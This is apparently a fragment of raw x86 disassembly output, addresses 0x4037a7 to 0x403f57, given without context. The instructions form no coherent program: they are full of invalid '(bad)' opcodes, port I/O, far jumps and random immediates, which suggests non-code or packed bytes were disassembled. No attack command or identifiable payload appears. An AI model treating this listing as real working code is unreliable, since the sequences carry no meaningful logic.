  4037a7:	dec    edx
  4037a8:	test   edi,eax
  4037aa:	jmp    0xadb0:0x8bd721de
  4037b1:	ins    BYTE PTR es:[edi],dx
  4037b2:	fbstp  TBYTE PTR [eax]
  4037b4:	ror    BYTE PTR [edx],0x18
  4037b7:	shl    BYTE PTR ds:0xdcecc937,0x7d
  4037be:	sbb    eax,0xe89b48b7
  4037c3:	add    DWORD PTR [edi-0x4fdba84e],edi
  4037c9:	les    edx,FWORD PTR [edi]
  4037cb:	mov    eax,ss:0x5aeee821
  4037d1:	dec    eax
  4037d2:	(bad)  
  4037d3:	xor    dh,BYTE PTR [esi+0x3f0dba]
  4037d9:	nop    DWORD PTR [ecx-0x11]
  4037dd:	push   edi
  4037de:	in     eax,dx
  4037df:	test   BYTE PTR [eax+edx*1+0x4e],0x12
  4037e4:	and    edx,edx
  4037e6:	push   ebx
  4037e7:	(bad)  
  4037e8:	mov    BYTE PTR [edx-0x2c],bl
  4037eb:	in     eax,dx
  4037ec:	ins    DWORD PTR es:[edi],dx
  4037ed:	hlt    
  4037ee:	imul   edi,DWORD PTR [ebp+ebx*8-0x741bcada],0xfffffff0
  4037f6:	mov    dh,0x7c
  4037f8:	frstor [bp+0x7544]
  4037fd:	into   
  4037fe:	mov    esi,0xc0819b9e
  403803:	jmp    0xf6e76f2a
  403808:	repnz clc 
  40380a:	push   si
  40380c:	push   di
  40380e:	mov    eax,ds:0x7b4d2dee
  403813:	jge    0x4037d7
  403815:	ret    
  403816:	test   DWORD PTR [ebx],edx
  403818:	push   ds
  403819:	pop    edi
  40381a:	outs   dx,BYTE PTR ds:[esi]
  40381b:	dec    edx
  40381c:	aaa    
  40381d:	mov    ds:0xd3b0d739,al
  403822:	test   al,0xc8
  403824:	adc    dh,dh
  403826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403827:	mov    bh,BYTE PTR [ecx-0x59]
  40382a:	shl    DWORD PTR [eax-0xc],1
  40382d:	pop    ds
  40382e:	jo     0x4037ce
  403830:	stc    
  403831:	jb     0x40387e
  403833:	out    0x8,eax
  403835:	push   es
  403836:	lock (bad) 
  403838:	xchg   esi,eax
  403839:	sbb    eax,0xff62863d
  40383e:	inc    edi
  40383f:	dec    esp
  403840:	push   esp
  403841:	dec    ecx
  403842:	mov    dl,0x5b
  403844:	jnp    0x403818
  403846:	jns    0x403814
  403848:	(bad)  
  403849:	fxch   st(3)
  40384b:	fisttp DWORD PTR [esp+ebp*8-0x3]
  40384f:	mov    dh,BYTE PTR [ecx]
  403851:	clc    
  403852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403853:	or     dh,bl
  403855:	cmp    BYTE PTR [ecx+0x55],al
  403858:	sti    
  403859:	fstp   TBYTE PTR [esi+0x53854b3d]
  40385f:	into   
  403860:	xchg   edx,eax
  403861:	sbb    BYTE PTR [eax+ebx*4+0x58],dl
  403865:	int3   
  403866:	jns    0x403814
  403868:	jbe    0x4038d8
  40386a:	int    0xe5
  40386c:	fldenv [edi]
  40386e:	xor    BYTE PTR [ebp+0x14],0xd8
  403872:	pop    ds
  403873:	mov    dh,0x7b
  403875:	in     al,0x6a
  403877:	xchg   BYTE PTR [ebx-0x2997316c],bl
  40387d:	fisub  DWORD PTR [ecx+0x44]
  403880:	(bad)  
  403881:	sub    BYTE PTR [edi-0x3d],dl
  403884:	and    BYTE PTR [ebp+0x60],ch
  403887:	clc    
  403888:	mov    ah,0xfe
  40388a:	repz mov edi,ecx
  40388d:	ret    
  40388e:	or     bl,BYTE PTR [eax+edi*2+0x6d46f927]
  403895:	adc    DWORD PTR [ebp-0x83aec89],0xffffff86
  40389c:	ss jb  0x4038e2
  40389f:	stos   DWORD PTR es:[edi],eax
  4038a0:	in     eax,0xe8
  4038a2:	mul    BYTE PTR [esi]
  4038a4:	add    al,0x5a
  4038a6:	in     eax,0x8e
  4038a8:	js     0x403874
  4038aa:	outs   dx,BYTE PTR ds:[esi]
  4038ab:	psrad  mm0,QWORD PTR [edx]
  4038ae:	aam    0x1c
  4038b0:	cld    
  4038b1:	mov    eax,ds:0xff96df80
  4038b6:	loop   0x403894
  4038b8:	(bad)  
  4038b9:	jne    0x40387d
  4038bb:	add    BYTE PTR [edi],cl
  4038bd:	dec    eax
  4038be:	leave  
  4038bf:	aas    
  4038c0:	sbb    eax,DWORD PTR [edx+ebx*2]
  4038c3:	mov    ecx,0xf0ebd12a
  4038c8:	rcr    DWORD PTR [edi+eiz*4-0x6f855195],cl
  4038cf:	xchg   DWORD PTR [ecx+0x5a],eax
  4038d2:	rdpmc  
  4038d4:	in     eax,0x24
  4038d6:	and    al,BYTE PTR [edi+ecx*2]
  4038d9:	das    
  4038da:	mov    BYTE PTR [edx+0x3],bl
  4038dd:	xchg   esp,eax
  4038de:	jmp    0xf174dfb5
  4038e3:	sub    edi,DWORD PTR [ebx+0x10]
  4038e6:	push   ebx
  4038e7:	dec    esi
  4038e8:	sub    DWORD PTR [edi],edx
  4038ea:	push   cs
  4038eb:	adc    DWORD PTR [eax+eiz*2],edx
  4038ee:	jb     0x403933
  4038f0:	adc    dh,ch
  4038f2:	mov    edi,0xcd951fb7
  4038f7:	(bad)  
  4038f8:	das    
  4038f9:	adc    BYTE PTR [edx],bh
  4038fb:	(bad)  
  4038fc:	(bad)  
  4038fd:	bswap  ebx
  4038ff:	test   al,0x74
  403901:	call   0x464d:0xf76adcae
  403908:	mov    esp,0x7b80f8f5
  40390d:	inc    ebp
  40390e:	outs   dx,BYTE PTR ds:[esi]
  40390f:	pop    edx
  403910:	repz pushf 
  403912:	dec    ecx
  403913:	shl    BYTE PTR [ebx+ebp*2],1
  403916:	mov    dh,0xe8
  403918:	adc    edi,edx
  40391a:	dec    esp
  40391b:	push   ecx
  40391c:	pop    esi
  40391d:	push   0x237b5c58
  403922:	(bad)  
  403923:	aam    0x3d
  403925:	push   edi
  403926:	dec    edi
  403927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403928:	test   BYTE PTR [edi],0x6e
  40392b:	xor    BYTE PTR [ecx-0x52],al
  40392e:	aas    
  40392f:	pop    ebp
  403930:	aad    0x74
  403932:	inc    esi
  403933:	push   ds
  403934:	into   
  403935:	mov    esi,0xacbd9df1
  40393a:	(bad)  
  40393b:	ja     0x4039a9
  40393d:	in     al,dx
  40393e:	sub    ah,al
  403940:	inc    esi
  403941:	add    eax,0x24a94ee3
  403946:	add    eax,0x7bd7b1bf
  40394b:	stos   DWORD PTR es:[edi],eax
  40394c:	mov    ecx,0x596153a8
  403951:	inc    eax
  403952:	icebp  
  403953:	mov    ah,0xd9
  403955:	ss int3 
  403957:	push   cs
  403958:	out    0x28,eax
  40395a:	mov    BYTE PTR [eax],bl
  40395c:	lods   al,BYTE PTR ds:[esi]
  40395d:	sub    al,0xc4
  40395f:	neg    cl
  403961:	push   ebp
  403962:	(bad)  
  403964:	mov    ebp,0x100019e4
  403969:	icebp  
  40396a:	jge    0x4039b2
  40396c:	jns    0x40391b
  40396e:	or     al,0x96
  403970:	imul   BYTE PTR [ecx-0x53]
  403973:	mov    dh,0x7c
  403975:	ins    DWORD PTR es:[edi],dx
  403976:	test   eax,0xe85aa64b
  40397b:	or     esp,ebp
  40397d:	popf   
  40397e:	cmc    
  40397f:	sbb    BYTE PTR [edx-0x75],dl
  403982:	push   ecx
  403983:	enter  0xdea9,0x9d
  403987:	in     eax,dx
  403988:	xchg   ebp,eax
  403989:	push   cs
  40398a:	mov    ecx,0xd0cf1898
  40398f:	jg     0x4039a2
  403991:	cdq    
  403992:	push   esp
  403993:	jmp    0xe8fc:0xd9e9a97f
  40399a:	push   eax
  40399b:	sbb    al,0xe6
  40399d:	mov    al,ds:0xf090f5ba
  4039a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039a3:	and    BYTE PTR [edi],0x70
  4039a6:	cs pop edi
  4039a8:	pushf  
  4039a9:	xchg   ecx,eax
  4039aa:	push   esp
  4039ab:	mov    cl,0x5a
  4039ad:	ss xor al,0x59
  4039b0:	xchg   BYTE PTR fs:[ebx-0xe],ch
  4039b4:	push   es
  4039b5:	fdiv   DWORD PTR [esi]
  4039b7:	hlt    
  4039b8:	es ins WORD PTR es:[edi],dx
  4039bb:	dec    edi
  4039bc:	ret    
  4039bd:	jle    0x4039e9
  4039bf:	jmp    0x3632:0x28c8fe00
  4039c6:	adc    eax,0x5448a77d
  4039cb:	adc    dh,0x6d
  4039ce:	fdiv   DWORD PTR [ecx-0x28]
  4039d1:	and    bh,cl
  4039d3:	pusha  
  4039d4:	retf   0x1a8e
  4039d7:	xadd   BYTE PTR [edx-0x7d],dh
  4039db:	stos   BYTE PTR es:[edi],al
  4039dc:	(bad)  
  4039dd:	dec    ebx
  4039de:	mov    dh,0xdc
  4039e0:	cmp    al,0x4
  4039e2:	jp     0x403999
  4039e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e5:	shl    DWORD PTR [esi],1
  4039e7:	jle    0x403a2d
  4039e9:	pushf  
  4039ea:	xchg   esi,eax
  4039eb:	hlt    
  4039ec:	xor    ecx,esp
  4039ee:	pop    ds
  4039ef:	mov    DWORD PTR [edx+0x29],ecx
  4039f2:	sub    ebp,ebp
  4039f4:	cld    
  4039f5:	xor    BYTE PTR [ebx-0x47],ch
  4039f8:	jmp    0xa62c4897
  4039fd:	mov    esi,0xeb6ecf30
  403a02:	loop   0x4039ba
  403a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a05:	repnz sub DWORD PTR [esi-0x61],esi
  403a09:	cmp    BYTE PTR [eax+ebp*4-0x2a9576a3],dl
  403a10:	aad    0x9c
  403a12:	fsin   
  403a14:	ins    DWORD PTR es:[edi],dx
  403a15:	mov    al,0x85
  403a17:	xor    al,bh
  403a19:	aaa    
  403a1a:	sbb    eax,0x493fb6c
  403a1f:	xor    eax,DWORD PTR [edi+ebx*1+0xa1ce96]
  403a26:	push   ebp
  403a27:	xlat   BYTE PTR ds:[ebx]
  403a28:	and    esi,0x13c5716c
  403a2e:	jp     0x403a62
  403a30:	fs (bad) 
  403a32:	mov    al,ds:0x71741064
  403a37:	pop    ecx
  403a38:	(bad)  
  403a39:	and    DWORD PTR [eax],edx
  403a3b:	and    BYTE PTR [ecx],0xc5
  403a3e:	jo     0x4039f6
  403a40:	add    al,0x50
  403a42:	out    0xfd,al
  403a44:	mov    edx,0x75d76c3d
  403a49:	pop    edx
  403a4a:	push   edi
  403a4b:	xor    BYTE PTR [edi+0x66],0xcd
  403a4f:	(bad)  
  403a50:	jl     0x403a46
  403a52:	lock call 0x1ad1:0xa5c60517
  403a5a:	in     al,dx
  403a5b:	test   DWORD PTR fs:[esi+ebp*4],0xb5673cf6
  403a63:	push   0xffffffd6
  403a65:	dec    esp
  403a66:	hlt    
  403a67:	pop    edi
  403a68:	aam    0x61
  403a6a:	cmp    BYTE PTR [edi-0x4365e72d],bh
  403a70:	cmp    al,0xe9
  403a72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a73:	pop    esi
  403a74:	out    dx,al
  403a75:	xor    bl,BYTE PTR ds:0x21339aac
  403a7b:	jae    0x403a9f
  403a7d:	mov    ecx,0x1bae3ee7
  403a82:	mov    dh,BYTE PTR [edx+0x18ed7295]
  403a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a89:	mov    ds:0xbc2fa467,eax
  403a8e:	pusha  
  403a8f:	cmp    DWORD PTR [ecx],0xffffff81
  403a92:	mov    WORD PTR [eax],fs
  403a94:	sub    al,0x59
  403a96:	inc    esp
  403a97:	pop    esi
  403a98:	add    dl,BYTE PTR [eax+0x4351de6f]
  403a9e:	nop
  403a9f:	clc    
  403aa0:	mov    BYTE PTR [ecx],dh
  403aa2:	mov    esi,esi
  403aa4:	cmp    ch,al
  403aa6:	repz or esp,edx
  403aa9:	dec    eax
  403aaa:	xor    dl,BYTE PTR [ecx]
  403aac:	icebp  
  403aad:	adc    ebx,DWORD PTR [ebx-0x556cf825]
  403ab3:	xor    bh,BYTE PTR [esi+0x14]
  403ab6:	fidiv  DWORD PTR [esi-0x42]
  403ab9:	jge    0x403a60
  403abb:	out    dx,al
  403abc:	and    DWORD PTR [ebx],esp
  403abe:	dec    edx
  403abf:	cmc    
  403ac0:	push   edx
  403ac1:	adc    eax,0xe6391bb1
  403ac6:	mov    ebx,0x49a51a8d
  403acb:	add    bh,al
  403acd:	js     0x403aa4
  403acf:	popa   
  403ad0:	dec    eax
  403ad1:	jo     0x403b3f
  403ad3:	fnstsw WORD PTR [edx]
  403ad5:	inc    ecx
  403ad6:	sub    dh,al
  403ad8:	test   al,0x86
  403ada:	push   ebp
  403adb:	inc    esi
  403adc:	xor    eax,0x63763070
  403ae1:	push   ss
  403ae2:	inc    edi
  403ae3:	mov    esp,0x18e4bd1a
  403ae8:	cld    
  403ae9:	dec    ebx
  403aea:	fdiv   QWORD PTR [ebx+ebx*8+0x4c9acd4a]
  403af1:	(bad)  
  403af2:	jae    0x403b65
  403af4:	sbb    al,0x21
  403af6:	cmp    BYTE PTR [ecx+0x6b],al
  403af9:	dec    esi
  403afa:	mov    dh,0xc4
  403afc:	fcomp  QWORD PTR [eax-0x2a]
  403aff:	xor    DWORD PTR [edi],esp
  403b01:	ror    BYTE PTR [ebx-0x4c97c02f],1
  403b07:	sub    al,0x2f
  403b09:	clc    
  403b0a:	cs dec esi
  403b0c:	mov    ch,0x75
  403b0e:	ret    
  403b0f:	cli    
  403b10:	jns    0x403b8d
  403b12:	scas   al,BYTE PTR es:[edi]
  403b13:	mov    WORD PTR [esi],es
  403b15:	(bad)  
  403b16:	xor    DWORD PTR cs:[edx],esi
  403b19:	add    edi,DWORD PTR [edx+ecx*2+0x1c]
  403b1d:	xchg   edx,eax
  403b1e:	mov    bh,0x1f
  403b20:	mov    cl,0x79
  403b22:	neg    DWORD PTR [ebx-0x32]
  403b25:	adc    DWORD PTR [edi+0x1acfceed],edi
  403b2b:	div    DWORD PTR [ebx]
  403b2d:	ins    WORD PTR es:[edi],dx
  403b2f:	outs   dx,DWORD PTR ds:[esi]
  403b30:	inc    esi
  403b31:	pop    es
  403b32:	sbb    BYTE PTR [edi+ecx*8],dl
  403b35:	push   esi
  403b36:	pop    ds
  403b37:	pop    es
  403b38:	push   ecx
  403b39:	push   esp
  403b3a:	xor    eax,0x33
  403b3d:	icebp  
  403b3e:	clc    
  403b3f:	mov    eax,ds:0xc66958
  403b44:	xlat   BYTE PTR ds:[ebx]
  403b45:	push   ecx
  403b46:	mov    edx,0x6021ee5d
  403b4b:	imul   edx,DWORD PTR [edx]
  403b4e:	loop   0x403aed
  403b50:	and    eax,0x43854618
  403b55:	adc    DWORD PTR [ecx-0x2a],edx
  403b58:	jl     0x403b94
  403b5a:	and    ebx,edi
  403b5c:	push   edx
  403b5d:	dec    esp
  403b5e:	mov    edx,0x1a8d56d5
  403b63:	mov    bl,0xa5
  403b65:	enter  0xcfa9,0x62
  403b69:	mov    ebp,0x9ee96ff4
  403b6e:	popa   
  403b6f:	xor    BYTE PTR [ecx-0xbbaceee],dh
  403b75:	jb     0x403b6e
  403b77:	sar    ecx,1
  403b79:	pop    ds
  403b7a:	jbe    0x403bb5
  403b7c:	jp     0x403b5a
  403b7e:	fld    st(2)
  403b80:	ds xchg ebx,eax
  403b82:	adc    DWORD PTR [eax-0x2cbb2f1b],ebp
  403b88:	rcl    BYTE PTR [esi+0x31],cl
  403b8b:	cmc    
  403b8c:	ja     0x403b0e
  403b8e:	out    dx,eax
  403b8f:	mov    edi,0x93e45735
  403b94:	out    dx,al
  403b95:	ror    DWORD PTR [ebp-0x3c12227c],cl
  403b9b:	in     al,0xd0
  403b9d:	sub    bl,BYTE PTR [eax]
  403b9f:	push   esi
  403ba0:	sbb    DWORD PTR [eax+0x7d],edx
  403ba3:	aad    0x3e
  403ba5:	daa    
  403ba6:	jne    0x403c1c
  403ba8:	aaa    
  403ba9:	or     cl,BYTE PTR [eax]
  403bab:	gs scas al,BYTE PTR es:[edi]
  403bad:	rcl    DWORD PTR [esi],0x8d
  403bb0:	mov    ds,WORD PTR [edi+0xc]
  403bb3:	mov    ah,0xb
  403bb5:	pop    ebx
  403bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb7:	stos   BYTE PTR es:[edi],al
  403bb8:	int    0xff
  403bba:	fmul   QWORD PTR [eax]
  403bbc:	jge    0x403c36
  403bbe:	jge    0x403b7d
  403bc0:	dec    ebp
  403bc1:	and    dl,BYTE PTR [esi]
  403bc3:	xchg   ecx,eax
  403bc4:	loopne 0x403b5d
  403bc6:	mov    DWORD PTR [edx+0x4aa15318],ebp
  403bcc:	lock and ch,ch
  403bcf:	cmp    DWORD PTR [edx],0xed28bbde
  403bd5:	ss push ds
  403bd7:	imul   ebx,ebp,0x3df7e895
  403bdd:	mov    ebx,0x36bf7c5d
  403be2:	in     al,0x89
  403be4:	cmc    
  403be5:	jmp    FWORD PTR [ebx-0x57c10d2b]
  403beb:	xchg   edx,eax
  403bec:	inc    ebx
  403bed:	movnti DWORD PTR [esi],esi
  403bf0:	sti    
  403bf1:	jnp    0x403beb
  403bf3:	sbb    BYTE PTR [ebx+0x1977a878],bh
  403bf9:	pop    ds
  403bfa:	or     edi,esp
  403bfc:	data16 jb 0x403bf0
  403bff:	test   BYTE PTR [eax+ecx*4-0x29],0xf5
  403c04:	js     0x403c3f
  403c06:	jge    0x403c0e
  403c08:	ret    
  403c09:	in     eax,dx
  403c0a:	mov    WORD PTR [edx-0x24],es
  403c0d:	inc    edx
  403c0e:	fst    QWORD PTR [eax-0x17]
  403c11:	sbb    dh,dl
  403c13:	pop    ecx
  403c14:	scas   al,BYTE PTR es:[edi]
  403c15:	das    
  403c16:	nop
  403c17:	xchg   edx,eax
  403c18:	mov    gs,edi
  403c1a:	jmp    0x4df0:0x934b76ab
  403c21:	cmp    esp,esi
  403c23:	ror    bh,cl
  403c25:	enter  0x443b,0x7c
  403c29:	std    
  403c2a:	xchg   ecx,eax
  403c2b:	push   0x7803424a
  403c30:	inc    ebx
  403c31:	xchg   DWORD PTR [eax],eax
  403c33:	jge    0x403c62
  403c35:	xor    bh,dh
  403c37:	or     DWORD PTR [edi],0x47a8f760
  403c3d:	repnz das 
  403c3f:	sbb    DWORD PTR [edx+eax*4+0x252298ff],0x68
  403c47:	(bad)  
  403c48:	lods   eax,DWORD PTR ds:[esi]
  403c49:	jno    0x403cc4
  403c4b:	call   0x4b4483ad
  403c50:	(bad)  
  403c52:	leave  
  403c53:	addr16 jns 0x403c8d
  403c56:	pop    edx
  403c57:	xchg   ecx,eax
  403c58:	or     BYTE PTR [ebx],cl
  403c5a:	jecxz  0x403c4d
  403c5c:	cmp    ebx,esp
  403c5e:	enter  0x54ff,0x8c
  403c62:	xchg   ebx,eax
  403c63:	dec    edi
  403c64:	sahf   
  403c65:	repnz data16 (bad) 
  403c68:	fld    TBYTE PTR [ecx]
  403c6a:	data16 test al,0x9f
  403c6d:	and    ecx,DWORD PTR [eax+0x20]
  403c70:	retf   0x534
  403c73:	dec    esi
  403c74:	sub    BYTE PTR [edi-0x56],ch
  403c77:	mov    al,ds:0x495305a
  403c7c:	push   ss
  403c7d:	mov    edi,0x44929fec
  403c82:	mov    cs,ebp
  403c84:	adc    ecx,edx
  403c86:	mov    ds:0x3e37904e,al
  403c8b:	add    dl,BYTE PTR [esi]
  403c8d:	mov    ds:0x9b3045de,al
  403c92:	jno    0x403d0b
  403c94:	cmc    
  403c95:	fldenv [edi-0x6cd90a1e]
  403c9b:	shl    DWORD PTR [eax],cl
  403c9d:	mov    cl,BYTE PTR [esi+0x40]
  403ca0:	adc    eax,0x2c120e4
  403ca5:	sub    BYTE PTR [ebx+0x1afa433c],dh
  403cab:	push   eax
  403cac:	pushf  
  403cad:	bound  esi,QWORD PTR [edi+edx*2+0x16]
  403cb1:	jl     0x403cd3
  403cb3:	cdq    
  403cb4:	(bad)  
  403cb5:	jmp    0x1f51:0xcfc9a9ba
  403cbc:	or     eax,0xd22cc299
  403cc1:	mov    DWORD PTR [ecx+0x61abb381],ecx
  403cc7:	jnp    0x403cfd
  403cc9:	les    edx,FWORD PTR [ecx+ecx*1-0x15]
  403ccd:	dec    edx
  403cce:	push   ss
  403ccf:	iret   
  403cd0:	add    dh,BYTE PTR [eax+eax*8+0x780d3445]
  403cd7:	cli    
  403cd8:	fbstp  TBYTE PTR [edx+0x23dd3f75]
  403cde:	mov    dh,cl
  403ce0:	daa    
  403ce1:	and    ah,al
  403ce3:	fwait
  403ce4:	jo     0x403d2b
  403ce6:	sbb    al,0x36
  403ce9:	aad    0x69
  403ceb:	je     0x403cb7
  403ced:	fmul   st,st(7)
  403cef:	or     edi,DWORD PTR [edi+0x50]
  403cf2:	sub    DWORD PTR [ecx-0x6a],0x3d17dc2b
  403cf9:	push   esp
  403cfa:	retf   0xb5fe
  403cfd:	mov    edx,0xf2bd5649
  403d02:	or     esp,ebx
  403d04:	inc    edi
  403d05:	adc    al,BYTE PTR [ecx+0x62]
  403d08:	clc    
  403d09:	inc    eax
  403d0a:	push   ebp
  403d0b:	and    cl,BYTE PTR ds:0x83ef4832
  403d11:	daa    
  403d12:	mov    WORD PTR ds:0x6e348cb1,es
  403d18:	add    esi,edx
  403d1a:	sbb    eax,0x34e06fdc
  403d1f:	lods   eax,DWORD PTR ds:[esi]
  403d20:	xlat   BYTE PTR ds:[ebx]
  403d21:	or     ecx,ebx
  403d23:	inc    edx
  403d24:	mov    eax,ds:0xa8cd6863
  403d29:	(bad)  
  403d2a:	out    dx,eax
  403d2b:	ja     0x403d0d
  403d2d:	scas   eax,DWORD PTR es:[edi]
  403d2e:	test   eax,0x5874eae3
  403d33:	xor    eax,0xcb6df997
  403d38:	cwde   
  403d39:	inc    ecx
  403d3a:	inc    ebp
  403d3b:	or     bh,ch
  403d3d:	dec    edi
  403d3e:	ins    BYTE PTR es:[edi],dx
  403d3f:	and    eax,0xe7e5cc5b
  403d44:	mov    edx,DWORD PTR [ecx+0x50]
  403d47:	jbe    0x403d86
  403d49:	je     0x403cea
  403d4b:	div    bl
  403d4d:	jle    0x403d47
  403d4f:	sbb    ah,BYTE PTR [ecx]
  403d51:	jno    0x403dcf
  403d53:	pop    es
  403d54:	test   eax,0xa34c826a
  403d59:	or     eax,0xfeab19f8
  403d5e:	mov    al,ds:0xe0fd093c
  403d63:	push   cs
  403d64:	mov    esp,0xb4611a5c
  403d69:	outs   dx,DWORD PTR ds:[esi]
  403d6a:	push   esp
  403d6b:	dec    eax
  403d6c:	mov    ch,BYTE PTR [ebx-0x57]
  403d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d70:	sub    BYTE PTR [ebp+0xd],dl
  403d73:	cli    
  403d74:	xor    eax,ecx
  403d76:	sar    DWORD PTR ds:0x7b6769a5,cl
  403d7c:	scas   al,BYTE PTR es:[edi]
  403d7d:	add    bl,al
  403d7f:	repnz leave 
  403d81:	sbb    BYTE PTR [esi-0x34049f86],bh
  403d87:	ret    
  403d88:	add    ah,BYTE PTR [ebx+0x6b]
  403d8b:	daa    
  403d8c:	pop    esp
  403d8d:	aam    0xaf
  403d8f:	out    dx,eax
  403d90:	rcl    DWORD PTR [ebp-0x1b23e532],cl
  403d96:	mov    esp,0xfef2c22e
  403d9b:	sub    dh,ch
  403d9d:	push   esi
  403d9e:	dec    edx
  403d9f:	lods   al,BYTE PTR ds:[esi]
  403da0:	sahf   
  403da1:	pop    eax
  403da2:	test   al,0x7
  403da4:	stc    
  403da5:	jecxz  0x403df0
  403da7:	shl    BYTE PTR [ebx+0x4a],cl
  403daa:	xor    BYTE PTR [esi-0x55],dh
  403dad:	es retf 0x346b
  403db1:	jno    0x403dbe
  403db3:	iret   
  403db4:	es cdq 
  403db6:	icebp  
  403db7:	test   eax,0x84c6bf92
  403dbc:	dec    edx
  403dbd:	fnsave [eax+ebx*1]
  403dc0:	inc    esp
  403dc1:	jo     0x403e16
  403dc3:	inc    eax
  403dc4:	mov    ecx,0x627dac2c
  403dc9:	mov    esp,0x6d0dd04c
  403dce:	or     eax,0x4be0360
  403dd3:	pop    esp
  403dd4:	add    edx,DWORD PTR fs:[eax+0x180f5318]
  403ddb:	mov    al,ds:0x2e441939
  403de0:	mov    ds:0xcf9e25e5,eax
  403de5:	mov    esp,0xcbd514da
  403dea:	js     0x403dbb
  403dec:	pop    ds
  403ded:	dec    edx
  403dee:	aas    
  403def:	sbb    DWORD PTR [esi+0x63f7e5ce],ebx
  403df5:	ins    DWORD PTR es:[edi],dx
  403df6:	or     eax,0x9153ee19
  403dfb:	mov    eax,DWORD PTR [esp+ecx*2-0x2f817c81]
  403e02:	test   BYTE PTR [esi+eiz*8+0x31],dl
  403e06:	xor    dh,bl
  403e08:	mov    edi,0x9efb7f4c
  403e0d:	rcr    cl,0x10
  403e10:	sbb    BYTE PTR [ebx+0x9],bh
  403e13:	data16 in al,dx
  403e15:	pop    es
  403e16:	mov    bl,0x38
  403e18:	gs inc esi
  403e1a:	data16 icebp 
  403e1c:	or     BYTE PTR [eax],0xd3
  403e1f:	xor    ch,BYTE PTR [eax-0x62a20f51]
  403e25:	xchg   ebp,eax
  403e26:	ret    0xe780
  403e29:	rcl    DWORD PTR [eax-0x683ad563],cl
  403e2f:	aam    0xe
  403e31:	add    eax,0x391481f6
  403e36:	and    BYTE PTR [esi-0x4a0ea233],0x56
  403e3d:	stos   BYTE PTR es:[edi],al
  403e3e:	xor    edi,DWORD PTR [edx]
  403e40:	mov    edi,DWORD PTR [eax]
  403e42:	test   BYTE PTR [edx+edx*4+0x143dde94],bl
  403e49:	rcr    DWORD PTR [ebx],1
  403e4b:	les    edx,FWORD PTR [ecx-0x6a42d082]
  403e51:	mov    ebp,0x6cde1e38
  403e56:	aas    
  403e57:	push   eax
  403e58:	xor    al,0xc1
  403e5a:	ja     0x403ea8
  403e5c:	xor    BYTE PTR [esi+0x60d4e831],bh
  403e62:	cld    
  403e63:	clc    
  403e64:	mov    dl,0xd3
  403e66:	mov    ds:0x15a5cc89,al
  403e6b:	push   ecx
  403e6c:	lds    ebp,FWORD PTR [eax]
  403e6e:	fwait
  403e6f:	ror    esp,1
  403e71:	(bad)  [esi]
  403e73:	and    DWORD PTR [edi+eiz*4+0x34],ecx
  403e77:	jle    0x403ee3
  403e79:	mov    al,ds:0x2a5dc4fe
  403e7e:	aad    0x99
  403e80:	adc    bh,BYTE PTR [edi+0x6]
  403e83:	mov    al,ss:0x9bc3286e
  403e89:	inc    edx
  403e8a:	adc    al,0x95
  403e8c:	dec    ebp
  403e8d:	imul   DWORD PTR [ebx+0x4a7d95f7]
  403e93:	mov    eax,0x91fa2371
  403e98:	cdq    
  403e99:	xchg   esi,eax
  403e9a:	xchg   esi,eax
  403e9b:	and    DWORD PTR [ebx-0x7c],0xb7529270
  403ea2:	mov    dl,0xa7
  403ea4:	shl    BYTE PTR [edx+0x37],cl
  403ea7:	push   ecx
  403ea8:	jl     0x403f17
  403eaa:	imul   DWORD PTR [edx+0x6b]
  403ead:	nop
  403eae:	or     ah,BYTE PTR [ebx-0xdc3c4b4]
  403eb4:	jl     0x403e42
  403eb6:	(bad)  
  403eb7:	outs   dx,BYTE PTR ds:[esi]
  403eb8:	inc    ebp
  403eb9:	mov    esp,0xf4e78f75
  403ebe:	sub    al,0x23
  403ec0:	lods   eax,DWORD PTR ds:[esi]
  403ec1:	mov    ds:0x1db4ba79,eax
  403ec6:	xchg   BYTE PTR [ebp-0x7cf1bfe5],al
  403ecc:	cmp    esp,DWORD PTR [edx]
  403ece:	into   
  403ecf:	call   0xdc3b019e
  403ed4:	nop
  403ed5:	iret   
  403ed6:	xchg   esi,eax
  403ed7:	sub    ebp,DWORD PTR [edi-0x31]
  403eda:	imul   edx,DWORD PTR [ebp+0x67496063],0xffffffbf
  403ee1:	xor    cl,al
  403ee3:	dec    ebx
  403ee4:	pop    ds
  403ee5:	sahf   
  403ee6:	xor    DWORD PTR [ecx-0x7],ebp
  403ee9:	dec    ecx
  403eea:	jmp    0x403f0f
  403eec:	sub    eax,0xa6227b5c
  403ef1:	sub    esi,DWORD PTR cs:[eax-0x29]
  403ef5:	dec    ebp
  403ef6:	mov    dh,0x2
  403ef8:	jns    0x403ea8
  403efa:	xchg   edx,eax
  403efb:	cmp    cl,al
  403efd:	lea    edi,[eax+0x316c2035]
  403f03:	cmp    ah,BYTE PTR [edx]
  403f05:	js     0x403ee8
  403f07:	sub    al,0xd4
  403f09:	mov    ds:0x38821938,eax
  403f0e:	neg    DWORD PTR [esi]
  403f10:	jg     0x403f7c
  403f12:	leave  
  403f13:	or     bl,dh
  403f15:	or     bh,BYTE PTR [ebp+0x49]
  403f18:	inc    edx
  403f19:	add    ebp,ebx
  403f1b:	cwde   
  403f1c:	sub    DWORD PTR [ecx+0x4472966e],esp
  403f22:	pushf  
  403f23:	xchg   BYTE PTR [ecx-0x42],ah
  403f26:	mov    ah,0xbe
  403f28:	in     eax,0x35
  403f2a:	xchg   DWORD PTR [eax+0x704710a7],esi
  403f30:	pushf  
  403f31:	(bad)  [esi+0x4b]
  403f34:	sub    eax,0xac185bb8
  403f39:	dec    ebp
  403f3a:	mov    eax,ds:0xaedd2771
  403f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f40:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403f42:	je     0x403f15
  403f44:	(bad)  
  403f45:	loope  0x403f5a
  403f47:	mov    al,ds:0xfb441dd
  403f4c:	inc    ebx
  403f4d:	cmp    eax,0x2a06d6a4
  403f52:	and    eax,0x5b010f38
  403f57:	jno    0x403f72
